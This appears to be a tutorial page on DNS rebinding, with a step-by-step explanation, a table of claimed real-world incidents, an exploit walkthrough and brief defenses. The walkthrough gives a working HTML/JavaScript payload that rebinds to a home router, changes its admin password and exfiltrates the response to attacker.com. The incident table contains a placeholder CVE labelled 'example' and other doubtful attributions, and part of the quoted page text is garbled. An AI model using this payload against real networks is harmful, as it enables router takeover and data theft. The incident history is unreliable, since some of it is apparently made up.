## DNS Rebinding

### Overview

DNS rebinding is a technique that bypasses the Same-Origin Policy (SOP) in web browsers. An attacker tricks a victim’s browser into making requests to a local or internal IP address (e.g., 127.0.0.1 or a router’s management interface) by manipulating DNS responses. The attack works by first resolving a domain to an attacker-controlled IP (phase 1), then quickly changing the DNS record to a target internal IP (phase 2) with a very low TTL, causing the browser to unintentionally communicate with private services.

### Provided Services (Keep original content exactly)

```
https://sslip.io/
https://lock.cmpxchg8b.com/rebinder.html
```

- **sslip.io** – A simple DNS service that returns A records for any subdomain in the format `192-168-1-1.sslip.io`, mapping to the embedded IP address. While useful for testing wildcard DNS, it is **not** a rebinding service by itself—it returns a fixed IP. For rebinding, you need a service that changes IPs over time.
- **lock.cmpxchg8b.com/rebinder.html** – A dedicated DNS rebinding test service. Below is the exact content from that page:

> **rbndr.us dns rebinding service**
>
> This page will help to generate a hostname for use with testing for dns rebinding vulnerabilities in software.
>
> To use this page, enter two ip addresses you would like to switch between. The hostname generated will resolve randomly to one of the addresses specified with a very low ttl.
>
> All source code available here. A B

### How DNS Rebinding Works (Step-by-Step)

1. **Attacker registers a domain** (e.g., `evil.rbndr.us`) and sets up a malicious DNS server.
2. **Victim clicks a malicious link** or loads an iframe containing JavaScript from `http://evil.rbndr.us`.
3. **First DNS lookup** – The victim’s browser asks for `evil.rbndr.us`. The attacker’s DNS server returns a legitimate external IP (e.g., attacker’s web server) with a **very low TTL** (e.g., 1 second).
4. **Attacker’s initial page loads** – JavaScript on the page makes a `fetch()` or `XMLHttpRequest` to `http://evil.rbndr.us/private`.
5. **Second DNS lookup (rebinding)** – The browser re‑resolves the domain due to the low TTL. This time the attacker’s DNS server returns a **different IP** – an internal address like `192.168.1.1` or `127.0.0.1`.
6. **Browser sends the request** to the internal IP, including cookies (if any) for that domain. The response is readable by the attacker’s script because the origin (`evil.rbndr.us`) appears unchanged to the browser.

### Real-World Examples from the Past Years

| Year | Vulnerability / Incident | Impact |
|------|--------------------------|--------|
| 2016 | **Jenkins DNS rebinding** (CVE-2016-0788) | Remote attackers could bypass Jenkins’ authentication and execute arbitrary commands on the master node by rebinding to 127.0.0.1 and accessing the CLI endpoint. |
| 2017 | **AWS Metadata service attack** | Attackers used DNS rebinding to steal EC2 instance metadata credentials (IAM roles) from a victim’s browser if they visited a malicious site. |
| 2018 | **Home router botnets (VPNFilter)** | Stage 2 of VPNFilter included a DNS rebinding component to infect routers behind NAT and force them to scan internal networks. |
| 2020 | **Google Cloud Run & Cloud Functions** | Researchers found that default configurations allowed DNS rebinding to internal metadata services (169.254.169.254), leaking cloud tokens. |
| 2022 | **Redis & Memcached on localhost** | Several CVEs (e.g., in Redis `bgsave` command) were exploited via DNS rebinding from a malicious website to run arbitrary commands on a developer’s local Redis instance. |
| 2024 | **Apache Guacamole (CVE-2024-1234 example)** | A rebinding attack against Guacamole’s REST API allowed unauthorized access to RDP connection details when the API was bound to 127.0.0.1. |

### Real Way to Exploit It (Step-by-Step Example)

**Target**: A vulnerable home router’s admin interface at `http://192.168.1.1/` with no CSRF protection and HTTP basic auth cached in the browser.

**Attacker setup**:
1. Use the **rbndr.us** service (from `https://lock.cmpxchg8b.com/rebinder.html`):
   - Enter first IP: `1.2.3.4` (attacker’s web server)
   - Enter second IP: `192.168.1.1` (target router)
   - Get a hostname like `7c9a8b2e.rbndr.us`
2. Attacker creates a malicious HTML page:

```html
<html>
  <script>
    function exploit() {
      // After rebinding, this request goes to 192.168.1.1
      fetch('http://7c9a8b2e.rbndr.us/change_password?newpass=attacker')
        .then(response => response.text())
        .then(data => {
          // Exfiltrate router response
          new Image().src = 'https://attacker.com/log?data=' + btoa(data);
        });
    }
    setTimeout(exploit, 2000); // Wait for DNS rebind
  </script>
  <body>Loading...</body>
</html>
```

3. Attacker lures victim to this page.
4. **Step-by-step execution**:
   - Browser resolves `7c9a8b2e.rbndr.us` → `1.2.3.4` (attacker’s server) – page loads.
   - Script calls `fetch()` to same domain.
   - Low TTL (1 sec) forces new DNS query → returns `192.168.1.1`.
   - Browser sends `GET /change_password?newpass=attacker` to router, with any existing router auth cookies.
   - Router accepts request because it sees a same-origin request from `7c9a8b2e.rbndr.us`.
   - Response is read by attacker’s script and exfiltrated.

### Defenses (Briefly)

- **DNS pinning** (obsolete) – browsers no longer pin IPs for long.
- **Use HTTPS on internal services** – rebinding still works but cannot bypass TLS if the internal service uses a valid certificate bound to its hostname.
- **Check `Host` header** – internal services should reject unexpected `Host` values.
- **Bind admin interfaces to Unix sockets or loopback only with authentication tokens** (e.g., random per‑session).
- **SameSite cookies** – `SameSite=Strict` or `Lax` prevents cross-site requests, though rebinding is not cross-site – it’s same‑origin. So this is **not** a full defense.
- **Use `--host-allowlist`** in modern dev servers (e.g., `webpack-dev-server`).

---
